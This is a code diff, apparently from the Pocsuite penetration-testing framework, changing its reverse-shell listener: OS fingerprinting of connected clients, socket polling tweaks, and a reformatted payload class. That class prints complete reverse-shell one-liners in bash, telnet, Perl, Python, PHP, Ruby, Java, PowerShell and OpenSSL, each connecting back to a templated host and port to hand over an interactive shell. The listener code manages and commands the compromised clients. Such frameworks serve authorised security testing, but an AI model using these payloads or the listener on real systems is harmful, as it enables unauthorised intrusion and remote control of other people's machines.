@@ -41,6 +41,8 @@ def get_sock_listener(listen_port, listen_host="0.0.0.0", ipv6=False, protocol=N
         s.bind((listen_host, listen_port))
     except socket.error:
         s.close()
+        if conf.connect_back_host in kb.data.local_ips:
+            logger.warn(f'unable to listen on {listen_host}:{listen_port}, check if the port is occupied.')
         return None
 
     if protocol == socket.SOCK_STREAM:
@@ -83,31 +85,34 @@ def listener_worker():
 
 def list_clients():
     results = ''
+    # https://en.wikipedia.org/wiki/Uname
+    # https://en.wikipedia.org/wiki/Ver_(command)
+    os_fingerprint = {
+        'Linux': ['Linux', 'GNU'],
+        'macOS': ['Darwin'],
+        'Windows': ['Windows', 'PS ', 'C:\\', 'CYGWIN', 'MS-DOS', 'MSYS_NT', 'cmdlet'],
+        'BSD': ['FreeBSD', 'OpenBSD', 'NetBSD', 'MidnightBSD'],
+        'Solaris': ['SunOS']
+    }
     for i, client in enumerate(kb.data.clients):
         try:
-            client.conn.send(b'uname\n')
+            client.conn.send(b'uname\nver\n')
             ret = poll_cmd_execute(client).lower()
-            system = "unknown"
-            if ret:
-                if "darwin" in ret:
-                    system = "Darwin"
-                elif "linux" in ret:
-                    system = "Linux"
-                elif "uname" in ret:
-                    system = "Windows"
-
+            system, found = 'unknown', False
+            for o, ks in os_fingerprint.items():
+                if found:
+                    break
+                for k in ks:
+                    if k.lower() in ret.lower():
+                        system = o
+                        found = True
+                        break
         except Exception:  # If a connection fails, remove it
             del kb.data.clients[i]
             continue
 
-        results += (
-                str(i) +
-                "   " +
-                (desensitization(client.address[0]) if conf.ppt else str(client.address[0])) +
-                "    " +
-                " ({0})".format(system) +
-                '\n'
-        )
+        results += (f'{i}   ' + (desensitization(client.address[0]) if conf.ppt else str(client.address[0])) +
+                    f'     ({system})\n')
     data_to_stdout("----- Remote Clients -----" + "\n" + results)
 
 
@@ -204,9 +209,9 @@ def poll_cmd_execute(client, timeout=3):
         p.register(client.conn, event_mask)
         count = 0
         ret = ''
-
+        read_again = True
         while True:
-            events = p.poll(200)
+            events = p.poll(100)
             if events:
                 event = events[0][1]
                 if event & select.POLLERR:
@@ -218,15 +223,20 @@ def poll_cmd_execute(client, timeout=3):
                     ret = "execute command timeout\n"
                     break
                 else:
-                    ret += get_unicode(client.conn.recv(0x10000))
+                    time.sleep(0.05)
+                    ret += get_unicode(client.conn.recv(65536))
             else:
                 if ret:
+                    if read_again:
+                        read_again = False
+                        continue
                     break
                 elif count > timeout:
                     ret = "execute command timeout\n"
                     break
                 else:
                     data_to_stdout(".")
+                    read_again = False
                     time.sleep(1)
                     count += 1
 
@@ -234,17 +244,23 @@ def poll_cmd_execute(client, timeout=3):
     else:
         count = 0
         ret = ''
+        read_again = True
         while True:
-            ready = select.select([client.conn], [], [], 0.2)
+            ready = select.select([client.conn], [], [], 0.1)
             if ready[0]:
-                ret += get_unicode(client.conn.recv(0x10000))
+                time.sleep(0.05)
+                ret += get_unicode(client.conn.recv(65536))
             else:
                 if ret:
+                    if read_again:
+                        read_again = False
+                        continue
                     break
                 elif count > timeout:
                     ret = "execute command timeout\n"
                 else:
                     data_to_stdout('.')
+                    read_again = False
                     time.sleep(1)
                     count += 1
 
@@ -307,7 +323,7 @@ def handle_listener_connection():
             else:
                 save_history(AUTOCOMPLETE_TYPE.POCSUITE)
                 load_history(AUTOCOMPLETE_TYPE.POCSUITE)
-                data_to_stdout("Command Not Found... type ? for help.")
+                data_to_stdout("Command Not Found... type ? for help.\n")
 
         except KeyboardInterrupt:
             logger.warn('Interrupt: use the \'quit\' command to quit')
@@ -321,17 +337,36 @@ class REVERSE_PAYLOAD:
     BASH = """bash -c 'sh -i >& /dev/tcp/{0}/{1} 0>&1'"""
     BASH2 = """bash -c 'sh -i &gt;&amp; /dev/tcp/{0}/{1} 0&gt;&amp;1'"""
     TELNET = """rm -f /tmp/p; mknod /tmp/p p && telnet {0} {1} 0/tmp/p"""
-    PERL = """perl -e 'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""
-    PYTHON = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
+    PERL = (
+        """perl -e 'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));"""
+        """if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");"""
+        """open(STDERR,">&S");exec("/bin/sh -i");}};'"""
+    )
+    PYTHON = (
+        """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"""
+        """s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"""
+        """p=subprocess.call(["/bin/sh","-i"]);'"""
+    )
     PHP = """php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");'"""
     RUBY = """ruby -rsocket -e'f=TCPSocket.open("{0}",{1}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
-    JAVA = """
-    r = Runtime.getRuntime()
-    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-    p.waitFor()
-    """
-    POWERSHELL = """$client = New-Object System.Net.Sockets.TCPClient('{0}',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
-    OPENSSL = """rm -rf /tmp/s;mkfifo /tmp/s;/bin/sh -i </tmp/s 2>&1|openssl s_client -quiet -connect {0}:{1}>/tmp/s;rm -rf /tmp/s"""
+    JAVA = (
+        'r = Runtime.getRuntime()\n'
+        'p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{0}/{1};cat <&5 | '
+        'while read line; do $line 2>&5 >&5; done"] as String[])\n'
+        'p.waitFor()'
+    )
+    POWERSHELL = (
+        '''$client = New-Object System.Net.Sockets.TCPClient('{0}',{1});$stream = $client.GetStream();'''
+        '''[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)'''
+        '''{{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'''
+        '''$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';'''
+        '''$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'''
+        '''$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
+    )
+    OPENSSL = (
+        'rm -rf /tmp/s;mkfifo /tmp/s;/bin/sh -i </tmp/s 2>&1|openssl s_client -quiet -connect {0}:{1}>/tmp/s;'
+        'rm -rf /tmp/s'
+    )
 
 
 if __name__ == "__main__":
